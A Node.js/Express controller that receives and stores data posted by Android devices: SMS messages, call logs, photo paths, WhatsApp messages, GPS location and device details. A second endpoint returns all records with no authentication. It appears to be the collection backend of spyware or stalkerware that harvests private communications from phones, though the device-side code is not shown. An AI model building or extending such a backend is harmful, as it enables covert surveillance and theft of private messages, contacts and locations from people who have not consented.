const DeviceData = require('../models/DeviceData');

exports.createDeviceData = async (req, res) => {
  try {
    const data = req.body;
    
    const newData = new DeviceData({
      deviceId: data.device.device_id,
      timestamp: new Date(data.timestamp),
      location: {
        lat: data.location?.lat,
        lng: data.location?.lng,
        time: data.location?.time ? new Date(data.location.time) : null
      },
      sms: {
        count: data.sms?.count || 0,
        messages: data.sms?.list || []
      },
      calls: {
        count: data.calls?.count || 0,
        logs: data.calls?.list || []
      },
      photos: {
        count: data.photos?.count || 0,
        paths: data.photos?.list || []
      },
      whatsapp: {
        messages: data.whatsapp?.messages || []
      },
      deviceInfo: {
        model: data.device?.model,
        manufacturer: data.device?.manufacturer,
        androidVersion: data.device?.android_version,
        deviceId: data.device?.device_id
      }
    });

    const savedData = await newData.save();
    res.status(201).json(savedData);
  } catch (error) {
    console.error('Erro ao salvar dados:', error);
    res.status(500).json({ error: 'Erro interno do servidor' });
  }
};

exports.getAllDeviceData = async (req, res) => {
  try {
    const data = await DeviceData.find().sort({ createdAt: -1 });
    res.json(data);
  } catch (error) {
    res.status(500).json({ error: 'Erro ao buscar dados' });
  }
};
